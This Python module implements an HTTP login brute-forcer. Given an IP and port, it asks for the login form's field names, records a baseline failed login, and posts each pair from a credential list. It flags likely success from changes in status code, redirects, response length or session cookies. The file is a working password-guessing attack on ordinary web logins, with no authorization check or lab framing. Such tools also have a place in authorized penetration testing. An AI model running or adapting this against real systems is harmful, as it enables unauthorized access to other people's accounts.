import requests
from bruteforce.credentials_loader import load_credentials

def http_bruteforce(ip, port=80):
    creds = load_credentials()
    url = f"http://{ip}:{port}/"

    GREEN = "\033[92m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    RESET = "\033[0m"

    print(f"{YELLOW}[*] Trying HTTP brute-force on {url}{RESET}")
    session = requests.Session()

    headers = {
        "User-Agent": "Mozilla/5.0 (compatible; BruteForceTool/1.0)",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    use_username = input("[?] Does the site require a username? (y/n): ").strip().lower() == 'y'
    username_field = input("[?] Enter the name of the username field (default: 'username'): ").strip() or "username"
    password_field = input("[?] Enter the name of the password field (default: 'password'): ").strip() or "password"

    # Baseline failed login
    session.cookies.clear()
    fail_data = {password_field: "invalidpass"}
    if use_username:
        fail_data[username_field] = "invaliduser"

    try:
        fail_resp = session.post(url, data=fail_data, headers=headers, timeout=5, allow_redirects=False)
    except requests.RequestException as e:
        print(f"{RED}[!] Failed to get baseline response: {e}{RESET}")
        return None

    baseline_length = len(fail_resp.text)
    baseline_status = fail_resp.status_code
    baseline_redirect = fail_resp.headers.get("Location", "")
    baseline_cookies = set(session.cookies.get_dict().keys())

    for username, password in creds:
        try:
            session.cookies.clear()

            form_data = {password_field: password}
            if use_username:
                form_data[username_field] = username

            response = session.post(
                url,
                data=form_data,
                headers=headers,
                timeout=5,
                allow_redirects=False
            )

            response_cookies = set(session.cookies.get_dict().keys())
            new_cookies = response_cookies - baseline_cookies

            diff_len = abs(len(response.text) - baseline_length) > 50
            diff_status = response.status_code != baseline_status
            diff_redirect = response.headers.get("Location", "") != baseline_redirect
            has_new_auth_cookies = any(
                k.lower() in ['sessionid', 'session', 'auth', 'token']
                for k in response_cookies
            ) or bool(new_cookies)

            confidence = sum([diff_len, diff_status, diff_redirect, has_new_auth_cookies])

            if confidence >= 2:
                user_display = f"{username}:{password}" if use_username else f"{password}"
                print(f"{GREEN}[+] HTTP login likely successful: {user_display}{RESET}")
                print(f"    -> Response: status {response.status_code}, cookies: {response_cookies}")
                return (username, password) if use_username else (None, password)

        except requests.RequestException as e:
            print(f"{RED}[!] Request failed for {username}:{password} - {e}{RESET}")
            continue

    print(f"{RED}[-] No valid HTTP credentials found.{RESET}")
    return None
